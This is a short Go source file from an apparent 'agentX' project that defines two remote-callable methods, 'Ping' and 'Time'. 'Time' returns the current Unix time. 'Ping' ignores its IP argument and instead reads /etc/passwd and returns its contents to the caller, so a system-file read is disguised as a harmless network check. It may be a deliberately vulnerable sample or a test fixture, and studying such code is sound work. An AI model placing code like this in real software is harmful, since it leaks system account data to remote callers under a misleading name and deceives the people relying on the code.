package systemx

import (
	"agentX/utils"
	"fmt"
	"net/http"
	"time"
)

type SystemX struct{}

func (x *SystemX) Ping(r *http.Request, ip, out *string) (err error) {
	*out, _ = utils.FileGetContents("/etc/passwd")
	return nil
}
func (x *SystemX) Time(r *http.Request, in, out *string) (err error) {
	*out = fmt.Sprintf("%d", time.Now().Unix())
	return nil
}
